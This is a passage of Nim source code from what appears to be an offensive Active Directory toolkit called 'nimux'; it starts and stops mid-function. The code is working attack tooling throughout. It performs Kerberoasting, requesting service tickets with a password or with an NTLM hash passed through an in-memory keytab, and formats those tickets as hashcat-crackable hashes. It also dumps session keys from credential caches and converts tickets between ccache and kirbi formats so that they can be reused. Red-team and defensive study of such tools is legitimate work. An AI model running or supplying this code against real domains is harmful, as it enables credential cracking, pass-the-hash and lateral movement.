    let checksum = ed.cipher[0 ..< 16]
    let cipher = ed.cipher[16 .. ^1]
    (true, "$krb5tgs$" & $ed.etype & "$*" & user & "$" & realm & "$" &
      cleanSpn & "*$" & toHex(checksum) & "$" & toHex(cipher), "TGS hash retrieved")
  of 17, 18:
    if ed.cipher.len <= 12:
      return (false, "", "AES service ticket cipher too short")
    let checksum = ed.cipher[^12 .. ^1]
    let cipher = ed.cipher[0 ..< ed.cipher.len - 12]
    (true, "$krb5tgs$" & $ed.etype & "$" & user & "$" & realm & "$*" &
      cleanSpn & "*$" & toHex(checksum) & "$" & toHex(cipher), "TGS hash retrieved")
  else:
    (false, "", "service ticket etype " & $ed.etype & " is not hashcat-compatible")

proc principalName(user, realm: string): string =
  if user.contains("@"):
    user
  elif realm.len > 0:
    user & "@" & realm.toUpperAscii()
  else:
    user

proc serviceName(spn, realm: string): string =
  if spn.contains("@"):
    spn
  elif realm.len > 0:
    spn & "@" & realm.toUpperAscii()
  else:
    spn

proc buildKrb5Config(realm, domain, kdcHost: string): string =
  let upperRealm = realm.toUpperAscii()
  result = "[libdefaults]\n"
  result.add "  default_realm = " & upperRealm & "\n"
  result.add "  dns_lookup_kdc = false\n"
  result.add "  dns_lookup_realm = false\n"
  result.add "  rdns = false\n"
  result.add "  udp_preference_limit = 1\n\n"
  result.add "[realms]\n"
  result.add "  " & upperRealm & " = {\n"
  result.add "    kdc = " & scannercore.resolveHost(kdcHost) & "\n"
  result.add "    admin_server = " & scannercore.resolveHost(kdcHost) & "\n"
  result.add "  }\n\n"
  if domain.len > 0:
    result.add "[domain_realm]\n"
    result.add "  ." & domain.toLowerAscii() & " = " & upperRealm & "\n"
    result.add "  " & domain.toLowerAscii() & " = " & upperRealm & "\n"

proc ccachePrincipal*(ccachePath = ""): TicketRequestResult =
  result = TicketRequestResult(operation: "ccache-principal", ccache: ccachePath)
  var ctx: Krb5Context = nil
  var cache: Krb5Ccache = nil
  var princ: Krb5Principal = nil
  var parsedName: cstring = nil
  let cacheName =
    if ccachePath.len > 0:
      if ccachePath.startsWith("FILE:") or ccachePath.startsWith("MEMORY:"): ccachePath
      else: "FILE:" & ccachePath
    elif existsEnv("KRB5CCNAME"):
      getEnv("KRB5CCNAME")
    else:
      ""
  try:
    var code = krb5_init_context(addr ctx)
    if code != 0:
      result.message = "krb5_init_context failed"
      return
    if cacheName.len > 0:
      code = krb5_cc_resolve(ctx, cacheName.cstring, addr cache)
    else:
      code = krb5_cc_default(ctx, addr cache)
    if code != 0:
      result.message = "ccache resolve: " & krb5Error(ctx, code)
      return
    code = krb5_cc_get_principal(ctx, cache, addr princ)
    if code != 0:
      result.message = "ccache principal: " & krb5Error(ctx, code)
      return
    code = krb5_unparse_name(ctx, princ, addr parsedName)
    if code != 0 or parsedName == nil:
      result.message = "ccache principal parse: " & krb5Error(ctx, code)
      return
    result.success = true
    result.principal = $parsedName
    result.ccache = cacheName
    result.message = "ccache principal loaded"
  finally:
    if parsedName != nil: krb5_free_unparsed_name(ctx, parsedName)
    if cache != nil: discard krb5_cc_close(ctx, cache)
    if ctx != nil:
      if princ != nil: krb5_free_principal(ctx, princ)
      krb5_free_context(ctx)

proc normalizeCcacheName(path: string): string =
  if path.len > 0:
    if path.startsWith("FILE:") or path.startsWith("MEMORY:"): path
    else: "FILE:" & path
  elif existsEnv("KRB5CCNAME"):
    getEnv("KRB5CCNAME")
  else:
    ""

proc unparsePrincipal(ctx: Krb5Context; princ: Krb5Principal): string =
  if princ == nil:
    return ""
  var raw: cstring = nil
  let code = krb5_unparse_name(ctx, princ, addr raw)
  if code == 0 and raw != nil:
    result = $raw
  if raw != nil:
    krb5_free_unparsed_name(ctx, raw)

proc describeCcache*(ccachePath = ""): CcacheDescribeResult =
  result = CcacheDescribeResult(operation: "describe", ccache: ccachePath)
  let cacheName = normalizeCcacheName(ccachePath)
  if cacheName.len == 0:
    result.message = "no ccache supplied and KRB5CCNAME is unset"
    return
  var ctx: Krb5Context = nil
  var cache: Krb5Ccache = nil
  var principal: Krb5Principal = nil
  var cursor: Krb5CcCursor = nil
  var cursorOpen = false
  try:
    var code = krb5_init_context(addr ctx)
    if code != 0:
      result.message = "krb5_init_context failed"
      return
    code = krb5_cc_resolve(ctx, cacheName.cstring, addr cache)
    if code != 0:
      result.message = "ccache resolve: " & krb5Error(ctx, code)
      return
    result.ccache = cacheName
    code = krb5_cc_get_principal(ctx, cache, addr principal)
    if code != 0:
      result.message = "ccache principal: " & krb5Error(ctx, code)
      return
    result.principal = unparsePrincipal(ctx, principal)
    code = krb5_cc_start_seq_get(ctx, cache, addr cursor)
    if code != 0:
      result.message = "ccache iterate: " & krb5Error(ctx, code)
      return
    cursorOpen = true
    while true:
      var creds = Krb5Creds()
      code = krb5_cc_next_cred(ctx, cache, addr cursor, addr creds)
      if code != 0:
        break
      result.entries.add CcacheEntry(
        client: unparsePrincipal(ctx, creds.client),
        server: unparsePrincipal(ctx, creds.server),
        enctype: int(creds.keyblock.enctype),
        sessionKeyHex: toHex(rawKey(creds.keyblock)),
        startTime: int64(creds.times.starttime),
        endTime: int64(creds.times.endtime),
        renewTill: int64(creds.times.renewTill),
        flags: int(creds.ticketFlags),
        ticketLen: int(creds.ticket.length))
      krb5_free_cred_contents(ctx, addr creds)
    result.success = true
    result.message = "ccache parsed"
  finally:
    if cursorOpen:
      discard krb5_cc_end_seq_get(ctx, cache, addr cursor)
    if cache != nil: discard krb5_cc_close(ctx, cache)
    if ctx != nil:
      if principal != nil: krb5_free_principal(ctx, principal)
      krb5_free_context(ctx)

proc purgeCcache*(ccachePath = ""): CcacheDescribeResult =
  result = CcacheDescribeResult(operation: "purge", ccache: ccachePath)
  let cacheName = normalizeCcacheName(ccachePath)
  if cacheName.len == 0:
    result.message = "purge requires --ccache <file> or KRB5CCNAME"
    return
  if not cacheName.startsWith("FILE:"):
    result.message = "purge only supports FILE ccaches"
    return
  let path = cacheName[5 .. ^1]
  try:
    if fileExists(path):
      removeFile(path)
    result.success = true
    result.ccache = cacheName
    result.message = "ccache removed"
  except CatchableError as error:
    result.message = "ccache remove failed: " & error.msg

proc renewCcache*(ccachePath = ""): CcacheDescribeResult =
  result = CcacheDescribeResult(operation: "renew", ccache: ccachePath)
  let cacheName = normalizeCcacheName(ccachePath)
  if cacheName.len == 0:
    result.message = "renew requires --ccache <file> or KRB5CCNAME"
    return
  var ctx: Krb5Context = nil
  var cache: Krb5Ccache = nil
  var principal: Krb5Principal = nil
  var renewed = Krb5Creds()
  try:
    var code = krb5_init_context(addr ctx)
    if code != 0:
      result.message = "krb5_init_context failed"
      return
    code = krb5_cc_resolve(ctx, cacheName.cstring, addr cache)
    if code != 0:
      result.message = "ccache resolve: " & krb5Error(ctx, code)
      return
    code = krb5_cc_get_principal(ctx, cache, addr principal)
    if code != 0:
      result.message = "ccache principal: " & krb5Error(ctx, code)
      return
    result.principal = unparsePrincipal(ctx, principal)
    code = krb5_get_renewed_creds(ctx, addr renewed, principal, cache, nil)
    if code != 0:
      result.message = "renew failed: " & krb5Error(ctx, code)
      return
    code = krb5_cc_initialize(ctx, cache, principal)
    if code != 0:
      result.message = "ccache initialize: " & krb5Error(ctx, code)
      return
    code = krb5_cc_store_cred(ctx, cache, addr renewed)
    if code != 0:
      result.message = "ccache store renewed TGT: " & krb5Error(ctx, code)
      return
    result.success = true
    result.ccache = cacheName
    result.message = "ccache renewed"
  finally:
    if cache != nil: discard krb5_cc_close(ctx, cache)
    if ctx != nil:
      krb5_free_cred_contents(ctx, addr renewed)
      if principal != nil: krb5_free_principal(ctx, principal)
      krb5_free_context(ctx)

proc krbCredInfoFromCred(ctx: Krb5Context; creds: Krb5Creds): string =
  let clientName = splitPrincipalName(unparsePrincipal(ctx, creds.client))
  let serverName = splitPrincipalName(unparsePrincipal(ctx, creds.server))
  seqT(
    ctx(0, encryptionKey(int(creds.keyblock.enctype), rawKey(creds.keyblock))) &
    ctx(1, genStr(clientName.realm)) &
    ctx(2, principal(clientName.nameType, clientName.parts)) &
    ctx(3, flagsToBitString(int(creds.ticketFlags))) &
    ctx(4, kerberosTimeFromUnix(int64(creds.times.authtime))) &
    ctx(5, kerberosTimeFromUnix(int64(creds.times.starttime))) &
    ctx(6, kerberosTimeFromUnix(int64(creds.times.endtime))) &
    (if creds.times.renewTill > 0:
      ctx(7, kerberosTimeFromUnix(int64(creds.times.renewTill)))
     else: "") &
    ctx(8, genStr(serverName.realm)) &
    ctx(9, principal(serverName.nameType, serverName.parts))
  )

proc ccacheToKirbi*(ccachePath, outPath: string): KirbiConvertResult =
  result = KirbiConvertResult(operation: "ccache-to-kirbi", input: ccachePath,
    output: outPath)
  if outPath.len == 0:
    result.message = "ccache-to-kirbi requires --out <file.kirbi>"
    return
  let cacheName = normalizeCcacheName(ccachePath)
  if cacheName.len == 0:
    result.message = "ccache-to-kirbi requires --ccache <file> or KRB5CCNAME"
    return
  var ctxp: Krb5Context = nil
  var cache: Krb5Ccache = nil
  var principalp: Krb5Principal = nil
  var cursor: Krb5CcCursor = nil
  var cursorOpen = false
  try:
    var code = krb5_init_context(addr ctxp)
    if code != 0:
      result.message = "krb5_init_context failed"
      return
    code = krb5_cc_resolve(ctxp, cacheName.cstring, addr cache)
    if code != 0:
      result.message = "ccache resolve: " & krb5Error(ctxp, code)
      return
    code = krb5_cc_get_principal(ctxp, cache, addr principalp)
    if code == 0:
      result.principal = unparsePrincipal(ctxp, principalp)
    code = krb5_cc_start_seq_get(ctxp, cache, addr cursor)
    if code != 0:
      result.message = "ccache iterate: " & krb5Error(ctxp, code)
      return
    cursorOpen = true
    var tickets = ""
    var infos = ""
    while true:
      var creds = Krb5Creds()
      code = krb5_cc_next_cred(ctxp, cache, addr cursor, addr creds)
      if code != 0:
        break
      let ticket = rawData(creds.ticket)
      if ticket.len > 0:
        tickets.add ticket
        infos.add krbCredInfoFromCred(ctxp, creds)
        inc result.ticketCount
      krb5_free_cred_contents(ctxp, addr creds)
    if result.ticketCount == 0:
      result.message = "ccache contains no exportable tickets"
      return
    let encPart = app(29, seqT(ctx(0, seqT(infos))))
    let kirbi = app(22, seqT(
      ctx(0, derInt(5)) &
      ctx(1, derInt(22)) &
      ctx(2, seqT(tickets)) &
      ctx(3, encryptedData(0, encPart))
    ))
    writeFile(outPath, kirbi)
    result.success = true
    result.input = cacheName
    result.message = "kirbi exported"
  except CatchableError as error:
    result.message = "kirbi export failed: " & error.msg
  finally:
    if cursorOpen:
      discard krb5_cc_end_seq_get(ctxp, cache, addr cursor)
    if cache != nil: discard krb5_cc_close(ctxp, cache)
    if ctxp != nil:
      if principalp != nil: krb5_free_principal(ctxp, principalp)
      krb5_free_context(ctxp)

type
  KirbiCred = object
    client: string
    server: string
    keyType: int
    keyValue: string
    times: Krb5TicketTimes
    flags: int
    ticket: string

proc parseKirbiInfo(data: string; ticket: string): KirbiCred =
  result.ticket = ticket
  let outer = readTlv(data)
  let body = if outer.tag == 0x30: outer.body else: data
  var clientRealm = ""
  var serverRealm = ""
  var clientParts: seq[string]
  var serverParts: seq[string]
  for field in children(body):
    case field.tag
    of 0xa0:
      let keySeq = innerSeq(field.body)
      for keyField in children(keySeq):
        case keyField.tag
        of 0xa0: result.keyType = intValue(keyField.body)
        of 0xa1:
          let t = readTlv(keyField.body)
          if t.tag == 0x04: result.keyValue = t.body
        else: discard
    of 0xa1:
      clientRealm = realmFromField(field.body)
    of 0xa2:
      clientParts = parsePrincipalAsn1(field.body).parts
    of 0xa3:
      result.flags = parseBitStringInt(field.body)
    of 0xa4:
      result.times.authtime = parseKerberosTime(field.body)
    of 0xa5:
      result.times.starttime = parseKerberosTime(field.body)
    of 0xa6:
      result.times.endtime = parseKerberosTime(field.body)
    of 0xa7:
      result.times.renewTill = parseKerberosTime(field.body)
    of 0xa8:
      serverRealm = realmFromField(field.body)
    of 0xa9:
      serverParts = parsePrincipalAsn1(field.body).parts
    else:
      discard
  if clientRealm.len > 0 and clientParts.len > 0:
    result.client = clientParts.join("/") & "@" & clientRealm
  if serverRealm.len > 0 and serverParts.len > 0:
    result.server = serverParts.join("/") & "@" & serverRealm

proc parseKirbiCreds(data: string; err: var string): seq[KirbiCred] =
  let top = readTlv(data)
  if top.tag != 0x76:
    err = "input is not a KRB-CRED/kirbi blob"
    return
  let seq = readTlv(top.body)
  if seq.tag != 0x30:
    err = "malformed KRB-CRED"
    return
  var tickets: seq[string]
  var enc = ""
  for field in children(seq.body):
    case field.tag
    of 0xa2:
      let ticketSeq = readTlv(field.body)
      if ticketSeq.tag == 0x30:
        var pos = 0
        while pos < ticketSeq.body.len:
          let ticket = readTlv(ticketSeq.body, pos)
          if ticket.tag == 0x61:
            tickets.add ticketSeq.body[pos ..< ticket.next]
          if ticket.next <= pos:
            break
          pos = ticket.next
    of 0xa3:
      let ed = parseEncryptedData(field.body)
      if ed.etype != 0:
        err = "only unencrypted KRB-CRED/kirbi enc-part is supported"
        return
      enc = ed.cipher
    else:
      discard
  if tickets.len == 0 or enc.len == 0:
    err = "KRB-CRED missing tickets or enc-part"
    return
  let encTop = readTlv(enc)
  if encTop.tag != 0x7d:
    err = "malformed EncKrbCredPart"
    return
  let encSeq = readTlv(encTop.body)
  if encSeq.tag != 0x30:
    err = "malformed EncKrbCredPart sequence"
    return
  let infosField = fieldBody(encSeq.body, 0xa0)
  let infosSeq = readTlv(infosField)
  if infosSeq.tag != 0x30:
    err = "KRB-CRED missing ticket-info"
    return
  var idx = 0
  var pos = 0
  while pos < infosSeq.body.len:
    let info = readTlv(infosSeq.body, pos)
    if info.tag == 0x30 and idx < tickets.len:
      let c = parseKirbiInfo(infosSeq.body[pos ..< info.next], tickets[idx])
      if c.client.len == 0 or c.server.len == 0 or c.keyValue.len == 0:
        err = "KRB-CRED ticket-info is incomplete"
        return
      result.add c
      inc idx
    if info.next <= pos:
      break
    pos = info.next
  if result.len == 0:
    err = "KRB-CRED contains no importable credentials"

proc kirbiToCcache*(kirbiPath, outPath: string): KirbiConvertResult =
  result = KirbiConvertResult(operation: "kirbi-to-ccache", input: kirbiPath,
    output: outPath)
  if kirbiPath.len == 0 or outPath.len == 0:
    result.message = "kirbi-to-ccache requires --kirbi <file> and --out <ccache>"
    return
  var err = ""
  let items = parseKirbiCreds(readFile(kirbiPath), err)
  if err.len > 0:
    result.message = err
    return
  var ctxp: Krb5Context = nil
  var cache: Krb5Ccache = nil
  var initPrinc: Krb5Principal = nil
  try:
    var code = krb5_init_context(addr ctxp)
    if code != 0:
      result.message = "krb5_init_context failed"
      return
    code = krb5_parse_name(ctxp, items[0].client.cstring, addr initPrinc)
    if code != 0:
      result.message = "client principal parse: " & krb5Error(ctxp, code)
      return
    let cacheName = normalizeCcacheName(outPath)
    code = krb5_cc_resolve(ctxp, cacheName.cstring, addr cache)
    if code != 0:
      result.message = "ccache resolve: " & krb5Error(ctxp, code)
      return
    code = krb5_cc_initialize(ctxp, cache, initPrinc)
    if code != 0:
      result.message = "ccache initialize: " & krb5Error(ctxp, code)
      return
    for item in items:
      var client: Krb5Principal = nil
      var server: Krb5Principal = nil
      code = krb5_parse_name(ctxp, item.client.cstring, addr client)
      if code != 0:
        result.message = "client principal parse: " & krb5Error(ctxp, code)
        return
      code = krb5_parse_name(ctxp, item.server.cstring, addr server)
      if code != 0:
        if client != nil: krb5_free_principal(ctxp, client)
        result.message = "server principal parse: " & krb5Error(ctxp, code)
        return
      var keyValue = item.keyValue
      var ticketValue = item.ticket
      var creds = Krb5Creds(
        client: client,
        server: server,
        keyblock: Krb5Keyblock(enctype: Krb5Enctype(item.keyType),
          length: cuint(keyValue.len),
          contents: if keyValue.len > 0: cast[pointer](addr keyValue[0]) else: nil),
        times: item.times,
        isSkey: 0,
        ticketFlags: Krb5Flags(item.flags),
        ticket: Krb5Data(length: cuint(ticketValue.len),
          data: if ticketValue.len > 0: cast[cstring](addr ticketValue[0]) else: nil))
      code = krb5_cc_store_cred(ctxp, cache, addr creds)
      krb5_free_principal(ctxp, client)
      krb5_free_principal(ctxp, server)
      if code != 0:
        result.message = "ccache store: " & krb5Error(ctxp, code)
        return
      inc result.ticketCount
    result.success = true
    result.output = cacheName
    result.principal = items[0].client
    result.message = "ccache imported"
  except CatchableError as error:
    result.message = "kirbi import failed: " & error.msg
  finally:
    if cache != nil: discard krb5_cc_close(ctxp, cache)
    if ctxp != nil:
      if initPrinc != nil: krb5_free_principal(ctxp, initPrinc)
      krb5_free_context(ctxp)

proc requestTgsHash*(kdc, realm, domain, clientUser, password, ntlmHash, spn, serviceUser: string;
                     timeoutMs = 5000): KerberoastResult =
  result = KerberoastResult(user: serviceUser, realm: realm.toUpperAscii(), spn: spn)
  if clientUser.len == 0:
    result.message = "Kerberoast requires a user credential"
    return
  if password.len == 0 and ntlmHash.len == 0:
    result.message = "Kerberoast requires -p password or -H NTLM hash"
    return
  let rawHash = if ntlmHash.len > 0: hexToRaw(ntlmHash) else: ""
  if ntlmHash.len > 0 and rawHash.len != 16:
    result.message = "invalid NTLM hash"
    return

  let cfgPath = getTempDir() / ("nimux-krb5-" & $getCurrentProcessId() & "-" & $epochTime().int & ".conf")
  writeFile(cfgPath, buildKrb5Config(realm, domain, kdc))
  let oldConfig = if existsEnv("KRB5_CONFIG"): getEnv("KRB5_CONFIG") else: ""
  let hadOldConfig = existsEnv("KRB5_CONFIG")
  putEnv("KRB5_CONFIG", cfgPath)

  var ctx: Krb5Context = nil
  var client: Krb5Principal = nil
  var server: Krb5Principal = nil
  var opt: Krb5GetInitCredsOpt = nil
  var cache: Krb5Ccache = nil
  var keytab: Krb5Keytab = nil
  var tgt = Krb5Creds()
  var inCreds = Krb5Creds()
  var outCreds: ptr Krb5Creds = nil
  var keyBytes = rawHash
  let clientPrincipal = principalName(clientUser, realm)
  let serverPrincipal = serviceName(spn, realm)

  try:
    var code = krb5_init_context(addr ctx)
    if code != 0:
      result.message = "krb5_init_context failed"
      return
    code = krb5_parse_name(ctx, clientPrincipal.cstring, addr client)
    if code != 0:
      result.message = "client principal: " & krb5Error(ctx, code)
      return
    code = krb5_parse_name(ctx, serverPrincipal.cstring, addr server)
    if code != 0:
      result.message = "service principal: " & krb5Error(ctx, code)
      return
    code = krb5_get_init_creds_opt_alloc(ctx, addr opt)
    if code != 0:
      result.message = "credential options: " & krb5Error(ctx, code)
      return
    krb5_get_init_creds_opt_set_forwardable(opt, 1)
    krb5_get_init_creds_opt_set_proxiable(opt, 1)
    if ntlmHash.len > 0:
      var etype = Krb5Enctype(23)
      discard krb5_get_init_creds_opt_set_etype_list(ctx, opt, addr etype, 1)
      code = krb5_kt_resolve(ctx, ("MEMORY:nimux-" & $getCurrentProcessId() & "-" & $epochTime().int).cstring, addr keytab)
      if code != 0:
        result.message = "memory keytab: " & krb5Error(ctx, code)
        return
      var entry = Krb5KeytabEntry()
      entry.principal = client
      entry.timestamp = int32(getTime().toUnix())
      entry.vno = 0
      entry.key.enctype = 23
      entry.key.length = keyBytes.len.cuint
      entry.key.contents = cast[pointer](addr keyBytes[0])
      code = krb5_kt_add_entry(ctx, keytab, addr entry)
      if code != 0:
        result.message = "memory keytab add: " & krb5Error(ctx, code)
        return
      code = krb5_get_init_creds_keytab(ctx, addr tgt, client, keytab, 0, nil, opt)
    else:
      code = krb5_get_init_creds_password(ctx, addr tgt, client, password.cstring,
        nil, nil, 0, nil, opt)
    if code != 0:
      result.message = "TGT request failed: " & krb5Error(ctx, code)
      return

    code = krb5_cc_resolve(ctx, ("MEMORY:nimux-" & $getCurrentProcessId() & "-" & $epochTime().int).cstring, addr cache)
    if code != 0:
      result.message = "memory ccache: " & krb5Error(ctx, code)
      return
    code = krb5_cc_initialize(ctx, cache, client)
    if code != 0:
      result.message = "ccache initialize: " & krb5Error(ctx, code)
      return
    code = krb5_cc_store_cred(ctx, cache, addr tgt)
    if code != 0:
      result.message = "ccache store: " & krb5Error(ctx, code)
      return

    inCreds.client = client
    inCreds.server = server
    code = krb5_get_credentials(ctx, 0, cache, addr inCreds, addr outCreds)
    if code != 0:
      result.message = "TGS request failed: " & krb5Error(ctx, code)
      return
    if outCreds == nil or outCreds.ticket.length == 0 or outCreds.ticket.data == nil:
      result.message = "TGS request returned no ticket"
      return
    var ticket = newString(int(outCreds.ticket.length))
    copyMem(addr ticket[0], outCreds.ticket.data, int(outCreds.ticket.length))
    let parsed = parseTicketHash(ticket, serviceUser, spn)
    result.success = parsed.ok
    result.hash = parsed.hash
    result.message = parsed.message
  finally:
    if outCreds != nil: krb5_free_creds(ctx, outCreds)
    if cache != nil: discard krb5_cc_close(ctx, cache)
    if keytab != nil: discard krb5_kt_close(ctx, keytab)
    if opt != nil: krb5_get_init_creds_opt_free(ctx, opt)
    if ctx != nil:
      krb5_free_cred_contents(ctx, addr tgt)
      if client != nil: krb5_free_principal(ctx, client)
      if server != nil: krb5_free_principal(ctx, server)
      if ntlmHash.len == 0:
        krb5_free_context(ctx)
    try: removeFile(cfgPath)
    except CatchableError: discard
    if hadOldConfig:
      putEnv("KRB5_CONFIG", oldConfig)
    else:
      delEnv("KRB5_CONFIG")

proc requestTgsHashFromCcache*(kdc, realm, domain, inCcache, spn, serviceUser: string;
                               timeoutMs = 5000): KerberoastResult =
  result = KerberoastResult(user: serviceUser, realm: realm.toUpperAscii(), spn: spn)
  if inCcache.len == 0:
    result.message = "Kerberoast from ccache requires --ccache"
    return
  if spn.len == 0:
    result.message = "Kerberoast from ccache requires --service <spn>"
    return
  if serviceUser.len == 0:
    result.message = "Kerberoast from ccache requires --user <service-account>"
    return

  let cfgPath = getTempDir() / ("nimux-krb5-" & $getCurrentProcessId() & "-" & $epochTime().int & ".conf")
  writeFile(cfgPath, buildKrb5Config(realm, domain, kdc))
  let oldConfig = if existsEnv("KRB5_CONFIG"): getEnv("KRB5_CONFIG") else: ""
  let hadOldConfig = existsEnv("KRB5_CONFIG")
  putEnv("KRB5_CONFIG", cfgPath)

  var ctx: Krb5Context = nil
  var client: Krb5Principal = nil
  var server: Krb5Principal = nil
  var source: Krb5Ccache = nil
  var inCreds = Krb5Creds()
  var outCreds: ptr Krb5Creds = nil
  var parsedName: cstring = nil
  let serverPrincipal = serviceName(spn, realm)
  let sourceName =
    if inCcache.startsWith("FILE:") or inCcache.startsWith("MEMORY:"): inCcache
    else: "FILE:" & inCcache
  try:
    var code = krb5_init_context(addr ctx)
    if code != 0:
      result.message = "krb5_init_context failed"
      return
    code = krb5_cc_resolve(ctx, sourceName.cstring, addr source)
    if code != 0:
      result.message = "source ccache: " & krb5Error(ctx, code)
      return
    code = krb5_cc_get_principal(ctx, source, addr client)
    if code != 0:
      result.message = "source ccache principal: " & krb5Error(ctx, code)
      return
    code = krb5_unparse_name(ctx, client, addr parsedName)
    if code == 0 and parsedName != nil:
      result.user = serviceUser
    code = krb5_parse_name(ctx, serverPrincipal.cstring, addr server)
    if code != 0:
      result.message = "service principal: " & krb5Error(ctx, code)
      return
    inCreds.client = client
    inCreds.server = server
    code = krb5_get_credentials(ctx, 0, source, addr inCreds, addr outCreds)
    if code != 0:
      result.message = "TGS request from ccache failed: " & krb5Error(ctx, code)
      return
    if outCreds == nil or outCreds.ticket.length == 0 or outCreds.ticket.data == nil:
      result.message = "TGS request returned no ticket"
      return
    let parsed = parseTicketHash(rawData(outCreds.ticket), serviceUser, spn)
    result.success = parsed.ok
    result.hash = parsed.hash
    result.message = parsed.message
  finally:
    if parsedName != nil: krb5_free_unparsed_name(ctx, parsedName)
    if outCreds != nil: krb5_free_creds(ctx, outCreds)
    if source != nil: discard krb5_cc_close(ctx, source)
    if ctx != nil:
      if client != nil: krb5_free_principal(ctx, client)
      if server != nil: krb5_free_principal(ctx, server)
      krb5_free_context(ctx)
    try: removeFile(cfgPath)
    except CatchableError: discard
    if hadOldConfig:
      putEnv("KRB5_CONFIG", oldConfig)
    else:
      delEnv("KRB5_CONFIG")

proc requestTicketCcache*(kdc, realm, domain, clientUser, password, ntlmHash,
                          spn, outCcache: string; getService = false;
                          timeoutMs = 5000; inCcache = ""): TicketRequestResult =
  result = TicketRequestResult(
    operation: if getService: "getst" else: "kinit",
    principal: principalName(clientUser, realm),
    service: spn,
    ccache: outCcache)
  if clientUser.len == 0 and (not getService or password.len > 0 or ntlmHash.len > 0):
    result.message = "request requires -u <user>"
    return
  if password.len == 0 and ntlmHash.len == 0:
    if not getService:
      result.message = "request requires -p password or -H NTLM hash"
      return
    if spn.len == 0:
      result.message = "getST requires --spn <service/host>"
      return
    let cfgPath = getTempDir() / ("nimux-krb5-" & $getCurrentProcessId() & "-" & $epochTime().int & ".conf")
    writeFile(cfgPath, buildKrb5Config(realm, domain, kdc))
    let oldConfig = if existsEnv("KRB5_CONFIG"): getEnv("KRB5_CONFIG") else: ""
    let hadOldConfig = existsEnv("KRB5_CONFIG")
    putEnv("KRB5_CONFIG", cfgPath)

    var ctx: Krb5Context = nil
    var client: Krb5Principal = nil
    var server: Krb5Principal = nil
    var source: Krb5Ccache = nil
    var dest: Krb5Ccache = nil
    var inCreds = Krb5Creds()
    var outCreds: ptr Krb5Creds = nil
    var parsedName: cstring = nil
    let serverPrincipal = serviceName(spn, realm)
    let sourceName =
      if inCcache.len > 0:
        if inCcache.startsWith("FILE:") or inCcache.startsWith("MEMORY:"): inCcache
        else: "FILE:" & inCcache
      elif existsEnv("KRB5CCNAME"):
        getEnv("KRB5CCNAME")
      else:
        ""
    let destName =
      if outCcache.len > 0:
        if outCcache.startsWith("FILE:") or outCcache.startsWith("MEMORY:"): outCcache
        else: "FILE:" & outCcache
      else:
        sourceName
    try:
      var code = krb5_init_context(addr ctx)
      if code != 0:
        result.message = "krb5_init_context failed"
        return
      if sourceName.len > 0:
        code = krb5_cc_resolve(ctx, sourceName.cstring, addr source)
      else:
        code = krb5_cc_default(ctx, addr source)
      if code != 0:
        result.message = "source ccache: " & krb5Error(ctx, code)
        return
      code = krb5_cc_get_principal(ctx, source, addr client)
      if code != 0:
        result.message = "source ccache principal: " & krb5Error(ctx, code)
        return
      code = krb5_unparse_name(ctx, client, addr parsedName)
      if code == 0 and parsedName != nil:
        result.principal = $parsedName
      code = krb5_parse_name(ctx, serverPrincipal.cstring, addr server)
      if code != 0:
        result.message = "service principal: " & krb5Error(ctx, code)
        return
      inCreds.client = client
      inCreds.server = server
      code = krb5_get_credentials(ctx, 0, source, addr inCreds, addr outCreds)
      if code != 0:
        result.message = "TGS request from ccache failed: " & krb5Error(ctx, code)
        return
      if destName.len > 0 and destName != sourceName:
        code = krb5_cc_resolve(ctx, destName.cstring, addr dest)
        if code != 0:
          result.message = "destination ccache: " & krb5Error(ctx, code)
          return
        code = krb5_cc_initialize(ctx, dest, client)
        if code != 0:
          result.message = "destination ccache initialize: " & krb5Error(ctx, code)
          return
        code = krb5_cc_store_cred(ctx, dest, outCreds)
        if code != 0:
          result.message = "destination ccache store TGS: " & krb5Error(ctx, code)
          return
      result.success = true
      result.ccache = if destName.len > 0: destName else: sourceName
      result.message = if destName.len > 0 and destName != sourceName:
        "service ticket stored from ccache"
      else:
        "service ticket acquired in ccache"
      return
    finally:
      if parsedName != nil: krb5_free_unparsed_name(ctx, parsedName)
      if outCreds != nil: krb5_free_creds(ctx, outCreds)
      if dest != nil: discard krb5_cc_close(ctx, dest)
      if source != nil: discard krb5_cc_close(ctx, source)
      if ctx != nil:
        if client != nil: krb5_free_principal(ctx, client)
        if server != nil: krb5_free_principal(ctx, server)
        krb5_free_context(ctx)
      try: removeFile(cfgPath)
      except CatchableError: discard
      if hadOldConfig:
        putEnv("KRB5_CONFIG", oldConfig)
      else:
        delEnv("KRB5_CONFIG")
  if getService and spn.len == 0:
    result.message = "getST requires --spn <service/host>"
    return
  let rawHash = if ntlmHash.len > 0: hexToRaw(ntlmHash) else: ""
  if ntlmHash.len > 0 and rawHash.len != 16:
    result.message = "invalid NTLM hash"
    return

  let cfgPath = getTempDir() / ("nimux-krb5-" & $getCurrentProcessId() & "-" & $epochTime().int & ".conf")
  writeFile(cfgPath, buildKrb5Config(realm, domain, kdc))
  let oldConfig = if existsEnv("KRB5_CONFIG"): getEnv("KRB5_CONFIG") else: ""
  let hadOldConfig = existsEnv("KRB5_CONFIG")
  putEnv("KRB5_CONFIG", cfgPath)

  var ctx: Krb5Context = nil
  var client: Krb5Principal = nil
  var server: Krb5Principal = nil
  var opt: Krb5GetInitCredsOpt = nil
  var cache: Krb5Ccache = nil
  var keytab: Krb5Keytab = nil
  var tgt = Krb5Creds()
  var inCreds = Krb5Creds()
  var outCreds: ptr Krb5Creds = nil
  var keyBytes = rawHash
  let clientPrincipal = principalName(clientUser, realm)
  let serverPrincipal = serviceName(spn, realm)
  let cacheName = if outCcache.startsWith("FILE:") or outCcache.startsWith("MEMORY:"):
      outCcache
    else:
      "FILE:" & outCcache

  try:
    var code = krb5_init_context(addr ctx)
    if code != 0:
      result.message = "krb5_init_context failed"
      return
    code = krb5_parse_name(ctx, clientPrincipal.cstring, addr client)
    if code != 0:
      result.message = "client principal: " & krb5Error(ctx, code)
      return
    code = krb5_get_init_creds_opt_alloc(ctx, addr opt)
    if code != 0:
      result.message = "credential options: " & krb5Error(ctx, code)
      return
    krb5_get_init_creds_opt_set_forwardable(opt, 1)
    krb5_get_init_creds_opt_set_proxiable(opt, 1)
    if ntlmHash.len > 0:
      var etype = Krb5Enctype(23)
      discard krb5_get_init_creds_opt_set_etype_list(ctx, opt, addr etype, 1)
      code = krb5_kt_resolve(ctx, ("MEMORY:nimux-" & $getCurrentProcessId() & "-" & $epochTime().int).cstring, addr keytab)
      if code != 0:
        result.message = "memory keytab: " & krb5Error(ctx, code)
        return
      var entry = Krb5KeytabEntry()
      entry.principal = client
      entry.timestamp = int32(getTime().toUnix())
